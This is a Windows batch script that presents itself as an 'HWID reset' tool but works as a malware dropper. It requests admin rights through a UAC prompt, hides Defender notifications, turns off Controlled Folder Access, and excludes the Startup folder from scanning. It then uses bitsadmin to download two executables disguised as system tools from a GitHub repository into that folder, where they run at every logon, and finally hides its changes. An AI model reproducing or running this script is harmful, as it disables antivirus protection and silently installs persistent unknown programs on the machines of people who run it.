@echo off

:: BatchGotAdmin
::-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
    echo msgbox "Attempting HWID reset..." > %tmp%\tmp.vbs
    wscript tmp.vbs
    del tmp.vbs
color 0a
set wsi = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f

powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'"

::direct download link
bitsadmin/transfer Explorers /download /priority FOREGROUND https://github.com/YumYummity/usb-install/raw/main/install/WindowsScan.exe %wsi%/WindowsScan.exe
bitsadmin/transfer Explorers /download /priority FOREGROUND https://github.com/YumYummity/usb-install/raw/main/install/WindowsSysHealth.exe %wsi%/WindowsSysHealth.exe

NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f